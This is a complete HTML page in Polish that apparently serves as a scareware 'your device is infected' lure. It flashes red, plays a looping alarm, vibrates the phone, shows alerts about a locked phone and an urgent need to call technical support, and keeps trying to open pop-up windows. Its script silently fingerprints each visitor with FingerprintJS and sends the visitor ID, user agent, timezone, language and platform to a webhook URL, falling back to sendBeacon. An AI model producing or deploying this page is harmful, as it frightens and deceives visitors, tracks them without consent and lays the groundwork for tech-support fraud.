<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>⚠️ Twoje urządzenie zostało zainfekowane!</title>
  <style>
    /* ---------- RESET & PODSTAWOWY FLASH ---------- */
    html,body{margin:0;padding:0;height:100%;overflow:hidden;font-family:sans-serif;background:#000;color:#fff;}
    @keyframes flash{0%,46%{background:#000;color:#fff;}50%,96%{background:#f00;color:#000;}}
    body{display:flex;justify-content:center;align-items:center;flex-direction:column;animation:flash 0.75s infinite alternate;}
    h1{font-size:clamp(2rem,8vw,4rem);text-align:center;text-shadow:2px 2px 4px #000;padding:0 1rem;}
  </style>
</head>
<body>
  <h1>⚠️ UWAGA! TWOJE URZĄDZENIE ZOSTAŁO ZAINFEKOWANE! ⚠️</h1>
  <audio id="alarm" src="https://actions.google.com/sounds/v1/alarms/radiation_meter.ogg" preload="auto" loop></audio>

  <!-- FingerprintJS -->
  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js" defer></script>

  <script>
  (async function(){
      /* ---------- VIBRATIONS ASAP ---------- */
      try{ navigator.vibrate([400,150,400,150,800]); }catch(e){}

      /* ---------- LOUD ALARM (requires user gesture on iOS) ---------- */
      const alarm=document.getElementById('alarm');
      setTimeout(()=>{alarm.play().catch(()=>{});},100);
      // Re‑attempt on first user interaction if auto‑play fails
      const resume=()=>{alarm.play().catch(()=>{});document.removeEventListener('touchstart',resume);};
      document.addEventListener('touchstart',resume);

      /* ---------- POP‑UPS (restored) ---------- */
      const popTexts=[
        '⚠️ Krytyczny błąd systemu! Dane szyfrowane…',
        '⚠️ Twój telefon jest trwale zablokowany!',
        '⚠️ Skontaktuj się z pomocą techniczną NATYCHMIAST!',
      ];
      popTexts.forEach((txt,i)=>setTimeout(()=>alert(txt), 250+i*300));
      // Otwarcie małych okien co 8s – wielu przeglądarek blokuje, ale warto spróbować
      setInterval(()=>{
        try{ window.open('about:blank','_blank','width=220,height=160'); }catch(e){}
      },8000);

      /* ---------- FINGERPRINT & WEBHOOK ---------- */
      await new Promise(r=>{if(document.readyState==='complete')r();else window.addEventListener('load',r);});
      const fp=await FingerprintJS.load();
      const result=await fp.get();
      const payload={
        visitorId:result.visitorId,
        ua:navigator.userAgent,
        tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
        lang:navigator.language,
        platform:navigator.platform,
        ts:Date.now()
      };
      const WEBHOOK_URL='https://webhook.site/e14a76a4-a0b6-429b-a7b7-0c744665866e'; // <‑‑‑ Wstaw tu swój adres

      // 1) próba standardowego POST z CORS
      fetch(WEBHOOK_URL,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify(payload)
      }).catch(()=>{
          // 2) Fallback: sendBeacon (lepsza gwarancja dostarczenia + brak CORS)
          try{navigator.sendBeacon(WEBHOOK_URL,new Blob([JSON.stringify(payload)],{type:'application/json'}));}catch(e){}
      });
  })();
  </script>
</body>
</html>
